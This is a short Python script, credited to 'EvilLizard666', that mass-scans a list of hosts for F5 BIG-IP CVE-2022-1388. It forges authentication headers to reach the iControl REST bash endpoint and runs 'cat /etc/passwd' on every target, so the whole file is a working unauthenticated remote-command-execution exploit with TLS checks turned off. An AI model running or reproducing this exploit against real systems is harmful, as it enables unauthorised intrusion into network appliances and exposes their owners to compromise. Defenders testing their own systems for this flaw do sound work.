#!/usr/bin/python3
#Created by EvilLizard666

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

hosts_file_to_scan = open(sys.argv[1], 'r')
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'abc',
        'Authorization': 'Basic YWRtaW46'
    }

data = {'command': "run",'utilCmdArgs':"-c cat /etc/passwd"}
for i in hosts_file_to_scan.readlines():
    i = i.strip()
    check_url = i + '/mgmt/tm/util/bash'
    try:
        resp = requests.post(url=check_url, json=data, headers=headers, verify=False, timeout=5)
        if resp.status_code == 200 and 'www-data' in resp.text:
            print(i + " [+] VULNERABLE! To CVE-2022-1388")
        else:
            print(i + " [-] Not vulnerable")
    except:
            print(i + " [-] Cannot connect")
